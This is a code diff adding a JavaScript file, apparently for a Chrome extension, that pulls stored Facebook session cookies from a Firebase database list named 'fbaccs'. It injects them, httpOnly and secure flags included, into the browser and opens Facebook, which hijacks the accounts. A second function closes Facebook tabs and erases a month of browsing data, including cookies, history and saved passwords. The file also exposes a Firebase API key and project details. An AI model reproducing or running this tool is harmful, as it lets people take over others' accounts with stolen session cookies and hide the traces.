@@ -1,0 +1,88 @@
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyD3eAN86ZMD-RwjPMkAcPg0YRq9-MQkznQ",
+    authDomain: "facebook-hai.firebaseapp.com",
+    databaseURL: "https://facebook-hai.firebaseio.com",
+    storageBucket: "facebook-hai.appspot.com",
+    messagingSenderId: "666546126307"
+  };
+  firebase.initializeApp(config);
+
+
+var app = angular.module("app", ["firebase"]);
+app.controller("myCtrl", function($scope, $firebaseArray) {
+    var ref = firebase.database().ref().child("fbaccs");
+
+    $scope.fbaccs = $firebaseArray(ref);
+
+    $scope.setUser = function (cookies) {
+
+        for(var key in cookies){
+            var x = cookies[key];
+
+            chrome.cookies.set({
+                url: 'https://www.facebook.com/',
+                name: x.name,
+                value: x.value,
+                domain: x.domain,
+                path: x.path,
+                secure: x.secure,
+                httpOnly: x.httpOnly,
+                sameSite: x.sameSite,
+                expirationDate: x.expirationDate,
+                storeId: x.storeId
+            }, function (cookie){
+            })
+        }
+
+        chrome.tabs.create({
+            url: 'https://www.facebook.com/',
+            active: true
+        }, function (){
+
+        });
+
+    };
+
+    $scope.clear = function () {
+
+        chrome.windows.getAll({populate:true},function(windows){
+            windows.forEach(function(window){
+                window.tabs.forEach(function(tab){
+                    if(tab.url.match(/facebook.com/gi) == 'facebook.com'){
+                        chrome.tabs.remove(tab.id)
+                    }
+                });
+            });
+        });
+
+
+        var millisecondsPerWeek = 1000 * 60 * 60 * 24 * 30;
+        var oneWeekAgo = (new Date()).getTime() - millisecondsPerWeek;
+        chrome.browsingData.remove({
+            "since": oneWeekAgo,
+            "originTypes": {
+                "protectedWeb": true,
+                "unprotectedWeb": true
+            }
+        }, {
+            "appcache": true,
+            "cache": true,
+            "cookies": true,
+            "downloads": true,
+            "fileSystems": true,
+            "formData": true,
+            "history": true,
+            "indexedDB": true,
+            "localStorage": true,
+            "serverBoundCertificates": true,
+            "pluginData": true,
+            "passwords": true,
+            "webSQL": true
+        }, function () {
+            Materialize.toast('Clear browsing done!', 2000);
+        });
+
+
+    }
+});
